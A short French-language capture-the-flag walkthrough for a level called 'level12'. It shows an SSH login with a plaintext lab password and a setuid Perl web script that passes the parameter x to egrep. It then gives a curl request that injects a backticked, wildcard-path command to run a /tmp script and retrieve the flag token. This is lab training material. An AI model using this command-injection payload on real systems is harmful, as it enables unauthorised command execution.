# Level12

Se connecter en tant que `level12`:

    $ ssh 192.168.1.124 -p 4242 -l level12
    level12@192.168.1.124's password: fa6v5ateaw21peobuub8ipe6s

---

Premiere étape de recherche

    $ ls -la
    -rwsr-sr-x+ 1 flag12  level12  464 Mar  5  2016 level12.pl

Comme pour le level 4 on trouve dans le dossier `/var/www` et dans le home un fichier `level12.pl`.

Le script est un serveur web écoutant sur le port `4646`

Cette page web prend donc 2 paramètres cette fois ci, `x` et `y`.

- `x` Passe dans 2 regex, une pour passer tous les charactères en upper case, et une autre qui supprime tous les espaces, puis est utilisée pour executer la commande `egrep`.

- `y` ne nous servira pas.

`egrep` est une commande qui va rechercher un motif dans des dossiers qui respectent ce motif.

Il nous suffit donc de creer un script bash dans /tmp comme celui du level 05, en majuscules (pour la regex).

    $ vim /tmp/SCRIPT
    #!/bin/bash
    /bin/getflag > /tmp/flag12
    
    $ chmod +x /tmp/SCRIPT

Nous pouvons nous rendre sur l'url

    $ curl 'http://192.168.1.124:4646/?x=`/*/script`'

Il ne nous reste plus qu'à cat le fichier /tmp/flag12

    $ cat /tmp/flag12

Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
